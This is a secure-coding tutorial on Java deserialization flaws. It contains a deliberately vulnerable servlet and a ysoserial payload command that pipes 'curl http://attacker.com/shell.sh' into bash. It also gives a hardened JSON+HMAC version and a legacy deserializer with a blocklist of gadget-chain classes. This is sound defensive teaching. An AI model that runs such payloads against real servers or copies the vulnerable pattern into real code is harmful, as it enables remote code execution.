Using Java's native `ObjectInputStream` to deserialize untrusted data is one of the most dangerous vulnerabilities in Java applications. This pattern has led to critical exploits including the Apache Commons Collections vulnerability and contributed to attacks like Log4Shell.

**VULNERABLE CODE**:

```java
import java.io.*;
import javax.servlet.http.*;
import java.util.Base64;

public class UserSessionServlet extends HttpServlet {

    @Override
    protected void doPost(HttpServletRequest request, HttpServletResponse response) 
            throws IOException {

        // Get serialized session data from cookie
        Cookie[] cookies = request.getCookies();
        String sessionData = null;

        for (Cookie cookie : cookies) {
            if ("userSession".equals(cookie.getName())) {
                sessionData = cookie.getValue();
                break;
            }
        }

        if (sessionData != null) {
            // VULNERABLE: Deserializing untrusted data
            byte[] data = Base64.getDecoder().decode(sessionData);
            ByteArrayInputStream bais = new ByteArrayInputStream(data);
            ObjectInputStream ois = new ObjectInputStream(bais);

            try {
                // This can execute arbitrary code!
                UserSession session = (UserSession) ois.readObject();
                request.setAttribute("session", session);
            } catch (ClassNotFoundException e) {
                throw new IOException("Session deserialization failed", e);
            }
        }
    }
}
```

**Attack Payload**:
```bash
# Using ysoserial to generate malicious serialized object
java -jar ysoserial.jar CommonsCollections6 'curl http://attacker.com/shell.sh | bash' | base64 -w0

# Result is placed in userSession cookie:
# rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAAAI/QAAAAAAAAXNyADRvcmcu...
```

**Why This Is Dangerous**:
- `ObjectInputStream.readObject()` can instantiate any class on the classpath
- Gadget chains in common libraries (Commons Collections, Spring, etc.) allow arbitrary code execution
- Attacker controls the serialized bytes, so they control what objects are created
- Type casting happens AFTER deserialization, so the malicious code already executed
- No authentication or validation prevents the attack

**SECURE VERSION**:

```java
import java.io.*;
import javax.servlet.http.*;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.core.JsonProcessingException;
import java.util.Base64;
import javax.crypto.Mac;
import javax.crypto.spec.SecretKeySpec;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;

public class SecureUserSessionServlet extends HttpServlet {

    private static final ObjectMapper mapper = new ObjectMapper();
    private static final String HMAC_SECRET = System.getenv("SESSION_HMAC_SECRET");
    private static final String HMAC_ALGORITHM = "HmacSHA256";

    @Override
    protected void doPost(HttpServletRequest request, HttpServletResponse response) 
            throws IOException {

        Cookie[] cookies = request.getCookies();
        String sessionData = null;
        String sessionSignature = null;

        for (Cookie cookie : cookies) {
            if ("userSession".equals(cookie.getName())) {
                sessionData = cookie.getValue();
            } else if ("sessionSig".equals(cookie.getName())) {
                sessionSignature = cookie.getValue();
            }
        }

        if (sessionData != null && sessionSignature != null) {
            // Step 1: Verify HMAC signature before processing
            if (!verifySignature(sessionData, sessionSignature)) {
                response.sendError(HttpServletResponse.SC_FORBIDDEN, "Invalid session");
                return;
            }

            // Step 2: Use JSON deserialization with explicit type binding
            try {
                byte[] jsonBytes = Base64.getDecoder().decode(sessionData);
                String json = new String(jsonBytes, "UTF-8");

                // SAFE: JSON mapper only creates UserSession objects
                // No arbitrary class instantiation possible
                UserSession session = mapper.readValue(json, UserSession.class);

                // Step 3: Additional validation
                if (session.isValid()) {
                    request.setAttribute("session", session);
                }
            } catch (JsonProcessingException e) {
                getServletContext().log("Invalid session JSON: " + e.getMessage());
                response.sendError(HttpServletResponse.SC_BAD_REQUEST);
            }
        }
    }

    private boolean verifySignature(String data, String signature) {
        try {
            Mac mac = Mac.getInstance(HMAC_ALGORITHM);
            SecretKeySpec secretKey = new SecretKeySpec(
                HMAC_SECRET.getBytes("UTF-8"), HMAC_ALGORITHM);
            mac.init(secretKey);

            String expectedSig = Base64.getEncoder().encodeToString(
                mac.doFinal(data.getBytes("UTF-8")));

            // Constant-time comparison to prevent timing attacks
            return MessageDigest.isEqual(
                expectedSig.getBytes("UTF-8"), 
                signature.getBytes("UTF-8"));
        } catch (NoSuchAlgorithmException | InvalidKeyException 
                 | UnsupportedEncodingException e) {
            return false;
        }
    }
}
```

**Key Security Controls**:
- **JSON instead of Java serialization**: Jackson only maps JSON to specific class fields, no arbitrary class instantiation
- **HMAC signature verification**: Ensures data hasn't been tampered with before processing
- **Explicit type binding**: `readValue(json, UserSession.class)` only creates UserSession objects
- **Constant-time comparison**: Prevents timing attacks on signature verification

When you absolutely cannot avoid Java deserialization (legacy integrations, existing protocols), you need multiple layers of defense. This is common in enterprise environments with JMS queues, RMI interfaces, or proprietary protocols.

**PRODUCTION PATTERN**:

```java
import java.io.*;
import java.util.*;
import java.util.logging.Logger;
import javax.jms.*;
import org.apache.commons.io.serialization.ValidatingObjectInputStream;

public class SecureLegacyDeserializer {

    private static final Logger AUDIT_LOG = Logger.getLogger("SecurityAudit");
    private static final Logger ERROR_LOG = Logger.getLogger("ErrorLog");

    // Strict allowlist of classes that can be deserialized
    private static final Set<String> ALLOWED_CLASSES = Set.of(
        "com.company.dto.OrderMessage",
        "com.company.dto.CustomerData",
        "com.company.dto.ProductInfo",
        "java.lang.String",
        "java.lang.Integer",
        "java.lang.Long",
        "java.util.ArrayList",
        "java.util.HashMap",
        "java.util.Date"
    );

    // Classes that must NEVER be deserialized (known gadget chains)
    private static final Set<String> BLOCKED_CLASSES = Set.of(
        "org.apache.commons.collections.functors.InvokerTransformer",
        "org.apache.commons.collections.functors.InstantiateTransformer",
        "org.apache.commons.collections4.functors.InvokerTransformer",
        "org.springframework.beans.factory.ObjectFactory",
        "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
        "java.lang.Runtime",
        "java.lang.ProcessBuilder",
        "javax.script.ScriptEngineManager"
    );

    private final DeserializationMetrics metrics;
    private final AlertService alertService;

    public SecureLegacyDeserializer(DeserializationMetrics metrics, AlertService alertService) {
        this.metrics = metrics;
        this.alertService = alertService;
    }

    /**
     * Safely deserialize objects from legacy JMS queue
     * Uses Apache Commons IO ValidatingObjectInputStream
     */
    public <T> T deserializeLegacyMessage(byte[] data, Class<T> expectedType, 
            String sourceSystem) throws DeserializationException {

        long startTime = System.currentTimeMillis();
        String correlationId = UUID.randomUUID().toString();

        AUDIT_LOG.info(String.format(
            "[%s] Deserialization attempt from source=%s, expectedType=%s, size=%d bytes",
            correlationId, sourceSystem, expectedType.getName(), data.length));

        // Layer 1: Size limit to prevent DoS
        if (data.length > 1024 * 1024) { // 1MB max
            metrics.recordRejection(sourceSystem, "size_exceeded");
            throw new DeserializationException("Payload exceeds maximum size");
        }

        // Layer 2: Source system validation
        if (!isAuthorizedSource(sourceSystem)) {
            AUDIT_LOG.warning(String.format(
                "[%s] BLOCKED: Unauthorized source system: %s", 
                correlationId, sourceSystem));
            metrics.recordRejection(sourceSystem, "unauthorized_source");
            throw new DeserializationException("Unauthorized source system");
        }

        try (ByteArrayInputStream bais = new ByteArrayInputStream(data);
             ValidatingObjectInputStream vois = new ValidatingObjectInputStream(bais)) {

            // Layer 3: Configure allowlist filter
            for (String allowedClass : ALLOWED_CLASSES) {
                vois.accept(allowedClass);
            }

            // Layer 4: Configure blocklist filter (defense in depth)
            for (String blockedClass : BLOCKED_CLASSES) {
                vois.reject(blockedClass);
            }

            // Layer 5: Reject all wildcards and packages not explicitly allowed
            vois.reject("*");

            // Layer 6: Set maximum depth to prevent stack overflow
            // Custom implementation needed

            Object deserialized;
            try {
                deserialized = vois.readObject();
            } catch (InvalidClassException e) {
                // Attempted to deserialize blocked class
                AUDIT_LOG.severe(String.format(
                    "[%s] ATTACK DETECTED: Blocked class in payload from %s: %s",
                    correlationId, sourceSystem, e.getMessage()));

                alertService.sendSecurityAlert(
                    "Deserialization attack detected",
                    Map.of(
                        "correlationId", correlationId,
                        "sourceSystem", sourceSystem,
                        "blockedClass", e.classname,
                        "severity", "CRITICAL"
                    ));

                metrics.recordAttack(sourceSystem, e.classname);
                throw new DeserializationException("Invalid object in payload");
            }

            // Layer 7: Type verification AFTER safe deserialization
            if (!expectedType.isInstance(deserialized)) {
                AUDIT_LOG.warning(String.format(
                    "[%s] Type mismatch: expected=%s, actual=%s",
                    correlationId, expectedType.getName(), 
                    deserialized.getClass().getName()));
                throw new DeserializationException("Unexpected object type");
            }

            long duration = System.currentTimeMillis() - startTime;
            metrics.recordSuccess(sourceSystem, duration);

            AUDIT_LOG.info(String.format(
                "[%s] Deserialization successful in %dms", correlationId, duration));

            return expectedType.cast(deserialized);

        } catch (IOException | ClassNotFoundException e) {
            ERROR_LOG.severe(String.format(
                "[%s] Deserialization failed: %s", correlationId, e.getMessage()));
            metrics.recordError(sourceSystem, e.getClass().getSimpleName());
            throw new DeserializationException("Deserialization failed", e);
        }
    }

    private boolean isAuthorizedSource(String sourceSystem) {
        Set<String> authorizedSources = Set.of(
            "LEGACY_ERP_SYSTEM",
            "WAREHOUSE_MANAGEMENT",
            "PAYMENT_GATEWAY"
        );
        return authorizedSources.contains(sourceSystem);
    }
}

